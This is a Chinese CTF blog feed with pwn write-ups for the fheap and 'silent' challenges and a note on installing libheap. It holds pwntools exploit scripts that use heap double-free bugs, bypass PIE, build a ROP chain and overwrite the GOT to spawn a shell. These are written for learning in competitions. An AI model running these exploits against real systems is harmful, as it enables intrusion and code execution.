00000000 String          struc ; (sizeof=0x20, mappedto_2) ; XREF: String_list/o
00000000 data            ptr_or_str ?
00000010 length          dq ?
00000018 release_func    dq ?
00000020 String          ends
00000020
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 ptr_or_str      union ; (sizeof=0x10, mappedto_4) ; XREF: String/r
00000000 ptr             dq ?
00000000 str             db 16 dup(?)
00000000 ptr_or_str      ends
00000000
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 String_list     struc ; (sizeof=0x10, mappedto_5) ; XREF: .bss:Slist/r
00000000 inuse           dq ?
00000008 Str             dq ?                    ; offset
00000010 String_list     ends
</code></pre><p>结果分析建立了俩结构体..大概就是</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> String <span class="token punctuation">{</span>
    ptr_or_str data<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存字符数组或者字符串指针</span>
    <span class="token keyword">int</span>        length<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//长度</span>
    <span class="token keyword">void</span>       <span class="token punctuation">(</span><span class="token operator">*</span>release_func<span class="token punctuation">)</span><span class="token punctuation">(</span>String <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// free函数指针</span>

<span class="token punctuation">}</span>
<span class="token keyword">union</span> ptr_or_str <span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span> ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 8byte</span>
    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 16byte</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// 判断字符串长度是不是大于16, 大于16就堆上申请对应大小空间来存, 并把指针对应过来, 如果小的话, 就存在这个数组里</span>
<span class="token comment" spellcheck="true">// 小的对应的函数只free(String), 长的会free(String)并且free(String -> data.ptr)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>哦对, 题目输入有点坑, 哈哈哈<br>题目就只有两个功能, Create一个字符串和Delete一个字符串<br>漏洞的点在于Delete的时候没有判断是不是以及Delete过, 所以能double free</p>
<p>做了一天做不来…发现是因为开了<code>PIE</code>.. 我大概是个智障吧</p>
<h3 id="PIC"><a href="#PIC" class="headerlink" title="PIC"></a>PIC</h3><p>我加了<code>-fpic</code>, 之后, 仿佛程序没啥变化…地址每次也米有随机, 大概是这样子就可以加载到其他位置了, 但如果是一个可执行文件, 他每次也不会变, 所以其实只对so有用?</p>
<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>加了<code>-fpie</code>, 用IDA打开程序, 显示的都是一个比较小的偏移量,比如<code>0x61e</code>, 而运行之后, 发现他的代码段和数据段也会每次随机化, 但末尾12位不变, 就是运行之后他会变成<code>0x565555 61e</code>, 后12位还是<code>61e</code>.<br>仔细查了一下有<br><code>-fPIE</code> or <code>-fpie</code><br><code>-pie</code><br>…这个杂乱的关系我还是没搞懂<br>而这题是<code>gcc main.c -pie -fpic -o pwn</code>…<br>算了, 先到这里, 我知道这一段前面的内容就好了</p>
<p>所以这个时候我们要bypass PIE, 就要至少泄露出一个的地址…这道题目中的两个函数指针就可以做这个事情, 而我们要泄露这个指针我们至少要调用<code>printf</code>或者<code>puts</code>这样子的函数, 这个时候, 我们可以通过更改函数地址的末尾12bits来达到调用<code>release_func</code>的时候跑到任何距离他12bits的代码段来执行</p>
<p>而我们发现<br>Free1在<code>0xd52</code><br>Free2在<code>0xd6c</code><br>而<code>puts@plt</code>就在<code>0x990</code><br>所以我们可以把其中一个<code>Free</code>改成<code>puts</code>, 然后再泄露地址</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#encoding: utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'bash'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>

Debug <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">if</span> Debug <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">:</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fheap"</span><span class="token punctuation">)</span>


elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fheap"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">z</span><span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>a<span class="token punctuation">)</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> con<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"3.quit"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"create "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Pls give string size:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"str:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>con<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> payload<span class="token operator">=</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"3.quit"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"delete "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"id:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"sure?:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">ROP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ropchain  <span class="token operator">=</span> <span class="token string">"yes.padd"</span> <span class="token comment" spellcheck="true"># trash</span>
    <span class="token comment" spellcheck="true"># 下面是rop链</span>
    ropchain <span class="token operator">+=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">return</span> ropchain


<span class="token comment" spellcheck="true"># Stage1</span>
create<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># 这个时候相当于把1放到free_list里了</span>

create<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0, trash</span>
<span class="token comment" spellcheck="true"># 覆盖最后8位, 也就是函数指针, 让他变换成`call puts`</span>
create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'6'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> <span class="token string">'flag'</span> <span class="token operator">+</span> <span class="token string">'\x2d'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1(struc_str) -> 0(string)</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#注意...由于更改了函数指针, 这里没有free掉chunk0....</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span>
addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
addr <span class="token operator">=</span> addr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
base_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xd2d</span>

p<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"base_addr: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>base_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Stage2</span>
<span class="token comment" spellcheck="true"># 这个时候我们已经有base了, 所以就可以操作了...</span>
<span class="token comment" spellcheck="true"># 这个stage2假设我们有了libc..直接要修改got来起shell了</span>
<span class="token keyword">def</span> <span class="token function">stage2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pppp_ret <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x11dc</span>

    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 
    <span class="token comment" spellcheck="true"># 这个时候注意一下, 他这里是先free(chunk0) -> free(chunk1)</span>
    <span class="token comment" spellcheck="true"># 所以现在freelist里是1 -> 0 -> 1 -> 0 -> ....</span>

    create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 这里的`\x00`很重要, 这样子就不会破坏`fd`, 如果胡乱写的话, 就不是 1, 0 循环链表了..甚至可能再分配两次就会崩溃...!调试一下就知道了</span>

    create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pppp_ret<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0 -> 1</span>
    <span class="token comment" spellcheck="true"># 4 pop 会从高地址到低地址方向弹出来 0x8 * 4 - 0x20个字节</span>
    <span class="token comment" spellcheck="true"># 这样子就能弹出来栈里没用的数据, 然后就到就到buf[8..]部分</span>
    <span class="token comment" spellcheck="true">################</span>
    <span class="token comment" spellcheck="true"># buf是`[低](rbp - 0x110) ~ (rbp - 0x10)[高]`这0x100这些字节</span>
    <span class="token comment" spellcheck="true"># 现在栈顶是由于开始的`sub rsp, 120h`</span>
    <span class="token comment" spellcheck="true"># 现在的rsp是`rbp - 0x120`, 和buf相差0x10字节, 然后要把buf前8字节弹出来</span>
    <span class="token comment" spellcheck="true"># 而且call了我们的release_func之后栈里多了8字节的函数返回地址, 所以共0x20</span>
    <span class="token comment" spellcheck="true"># ---------------------------------------</span>
    <span class="token comment" spellcheck="true"># .....</span>
    <span class="token comment" spellcheck="true"># buf[8..16] ---> 我们rop的起点</span>
    <span class="token comment" spellcheck="true"># buf[0..8] -------------------------+ rbp - 0x110</span>
    <span class="token comment" spellcheck="true"># var_1                              +</span>
    <span class="token comment" spellcheck="true"># var_2                              + rbp - 0x120</span>
    <span class="token comment" spellcheck="true"># ret_addr_of_release_func ----------+ 栈顶</span>

    payload <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># 现在的data部分是chunk1了, 所以delete(1), 并且PPPPR之后就能返回到buf的第9字节, 前8字节是`yes.padd`(把yes填充到了8字节, 在第四个pop那里也弹出去了)</span>
    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># True_Stage2</span>
<span class="token comment" spellcheck="true"># 这题我们其实没有libc....所以我们要leak</span>
<span class="token comment" spellcheck="true"># flappypig的做法就是用格式化字符串</span>
<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
    printf_plt <span class="token operator">=</span> base_addr <span class="token operator">+</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>

    payload1 <span class="token operator">=</span> printf_payload <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span>
    create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> payload1<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># 这个printf_payload就是确定一下和address的距离然后填好</span>
    <span class="token comment" spellcheck="true"># 据说wp是`%9$s`</span>

    payload2 <span class="token operator">=</span> <span class="token string">"yes.padd"</span> <span class="token operator">+</span> address
    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload2<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># 这个时候处理收到的数据就可以了..</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token comment" spellcheck="true"># 处理好然后ret个值</span>
    <span class="token comment" spellcheck="true"># 然后这个函数就可以交给Dynleak了...</span>


<span class="token comment" spellcheck="true"># Stage3 就是更改got表, 拿shell了</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>又学到了好多QAQ, 我好菜…这道题当场做出来的真厉害, 这要是都写出来得写多少<br>暂时先放下了</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 补题 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[坑 | 安装libheap]]></title>
      <url>/2018/04/05/%E5%9D%91-%E5%AE%89%E8%A3%85libheap/</url>
      <content type="html"><![CDATA[<p>原来的<code>peda-heap</code>, 用着有点, emmmmm<br>然后准备装个<code>libheap</code>, 照着github的install操作一步一步来…</p>
<p>发现爆了一堆错…然后发现第一个问题就是因为…我的<code>pip3</code>居然是….<code>pip2</code>….</p>
<pre class="line-numbers language-bash"><code class="language-bash">haibin  ~  blog  pip3 --version
pip 9.0.1 from /usr/local/lib/python2.7/dist-packages <span class="token punctuation">(</span>python 2.7<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>QAQ, 为啥呀, 我<code>whereis pip3</code>, 得到的结果最后是<code>pip3</code>的正确路径啊….我的bashrc里也没啥奇怪的东西…</p>
<p>然后我只能用<code>/usr/bin/pip3</code>来代替<code>pip3</code>….之后又遇到一个问题<br>在<a href="https://github.com/cloudburst/libheap/issues/25" target="_blank" rel="external">项目的issue里</a>找到了解决方法, <code>apt-get install libc6-dbg:i386</code></p>
<p>虽然现在还时不时还报一些小错误…但能用了0.0</p>
]]></content>
      
        <categories>
            
            <category> issue </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[0ctf-2018 | 补题]]></title>
      <url>/2018/04/05/0ctf2018-%E8%A1%A5%E9%A2%98/</url>
      <content type="html"><![CDATA[<h2 id="PWN-babystack"><a href="#PWN-babystack" class="headerlink" title="PWN | babystack"></a>PWN | babystack</h2><p>ret-to-dl-resolve<br>todo</p>
<h2 id="PWN-blackhole"><a href="#PWN-blackhole" class="headerlink" title="PWN | blackhole"></a>PWN | blackhole</h2><p>ret-to-csu<br>todo</p>
<h2 id="PWN-babyheap"><a href="#PWN-babyheap" class="headerlink" title="PWN | babyheap"></a>PWN | babyheap</h2><p>todo</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 0ctf </tag>
            
            <tag> 补题 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[强网杯 | 补题]]></title>
      <url>/2018/04/03/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E8%A1%A5%E9%A2%98/</url>
      <content type="html"><![CDATA[<h2 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h2><p>fastbin是后进先出, 像栈一样, 相当于fastbin是栈顶指针, 指向最后来的块, 最先来的块(栈底)有<code>fd = NULL</code></p>
<p>fastbin 最简单的利用, list栈顶的chunk被malloc出去的时候, 他的<code>fd</code>就被作为fastbin的指向, 这样的话, 下次malloc的时候, 就能实现任意地址写…要做的就是在栈顶这一块malloc出去之前通过溢出改写他的<code>fd</code>指针就是问题的关键…一般是通过他前一块(更低地址)的块来覆写</p>
<p>第二种就是house of spirit…, 就是通过覆写<code>free(p)</code>这里的<code>p</code>指针的指向为我们的fake_chunk, 条件当然一般是溢出的时候能覆盖一个一会儿要free掉的指针, 还要能伪造堆块, 就可在下次malloc的把我们伪造的块给<code>malloc</code>出来, 实现任意地址写…</p>
<p>当然我们实现修改<code>fd</code>和修改<code>free</code>的参数时候不只可以溢出修改, 能改就行…比如像下面说的double free.</p>
<p>fastbin在double free的时候只要不是连续两次free同一个指针就不会被检查出来…(其实就是在插入fastbin的时候, 查看当前fastbinY的值和当前要插入chunk的值是不是相等), 所以可以在中间插入一个p1的free, <code>free(p0) -&gt; free(p1) -&gt; free(p0)</code>, 然后再<code>malloc() -&gt; malloc() -&gt; malloc()</code>, 就能在这操作之后(p0第一次malloc的时候写入假的fd, 第二次malloc的时候就可以使得fastbin list指向一个假的地址), 我们就能再次分配把fake的chunk给分配出来, 这个时候我们如果把fake的地址在got表, 那么就能够改写got表</p>
<p>思考UAF一般要做的是什么, 可以泄露地址. 还可以?</p>
<p>payload基本是参考大佬的…但为什么要把<code>free.got</code>改写成<code>system.plt</code>呢…为什么不是<code>system.got</code>…? 然而好像都是这么改的…为啥呢…<br>mdzz, <code>free.plt</code>里的<code>jmp &lt;free@got&gt;</code>, 会跳到<code>free.got</code>里存的那个地址, 然后执行那个地址对应的代码<br>如果在这个<code>free.got</code>里存入<code>system.got</code>, 那么就会把<code>system.got</code>当做代码执行, 然而got表是存储的地址, plt表才是代码(<code>jmp xxx</code>)<br>如果在这个<code>free.got</code>里存入<code>system.plt</code>, 那么就会执行<code>jmp &lt;system.got&gt;</code>, 从而调用system…(不管以前是不是调用过system, 都可以)</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

local <span class="token operator">=</span> <span class="token number">1</span>

<span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.107.32.132'</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./silent'</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./silent"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> con<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>con<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> con<span class="token punctuation">,</span> con_new<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>con<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>con_new<span class="token punctuation">)</span>

sys_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
free_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>

fake_chunk <span class="token operator">=</span> <span class="token number">0x601ffa</span>

add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>

free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">'sh'</span> <span class="token operator">+</span> <span class="token string">'\0'</span> <span class="token operator">*</span> <span class="token number">12</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_plt<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span> 

<span class="token comment" spellcheck="true"># 0x60200a + 0x10 + sh  = 0x602018</span>

free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># system(sh)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="silent-2"><a href="#silent-2" class="headerlink" title="silent 2"></a>silent 2</h2><p>和1的区别在于限制了申请的堆块的大小, 不能使用fastbin了, 要使用double free来…unlink一个bin, 是不是像0ctf-2015, freenote一样<br>看大佬的wp有一个词叫<code>heap overlap</code>(<code>https://ctf-wiki.github.io/ctf-wiki/pwn/heap/chunk_extend_shrink/</code>)<br>这个<code>overlap</code>, 大概是说, 举个例子</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// 32位下</span>
p0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">504</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">free</span><span class="token punctuation">(</span>p0<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>

p0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 这个时候就把原来两块的内容放缩成一块了</span>
<span class="token comment" spellcheck="true">// 1024 = 504 + 8 + 512</span>
<span class="token comment" spellcheck="true">// +-----------+</span>
<span class="token comment" spellcheck="true">// | prev_size |</span>
<span class="token comment" spellcheck="true">// +-----------+</span>
<span class="token comment" spellcheck="true">// |size=0x408 |</span>
<span class="token comment" spellcheck="true">// +-----------+----+</span>
<span class="token comment" spellcheck="true">// |fake_prev  |    +</span>
<span class="token comment" spellcheck="true">// |fake_size  |    +</span>
<span class="token comment" spellcheck="true">// |fake_fd    |  0x200</span>
<span class="token comment" spellcheck="true">// |fake_bk    |    +</span>
<span class="token comment" spellcheck="true">// |padding    |    +</span>
<span class="token comment" spellcheck="true">// +-----------+----+</span>
<span class="token comment" spellcheck="true">// |fake_prev  |    </span>
<span class="token comment" spellcheck="true">// |fake_size--+>0x208</span>
<span class="token comment" spellcheck="true">// |padding    |    </span>
<span class="token comment" spellcheck="true">// +-----------+</span>
<span class="token function">edit</span><span class="token punctuation">(</span>p0<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 这个时候伪造堆块, 伪造成两块, 一会儿unlink</span>
<span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 然后这个时候再free(p1), 就是两次free(p1)了...这个时候会触发unlink</span>
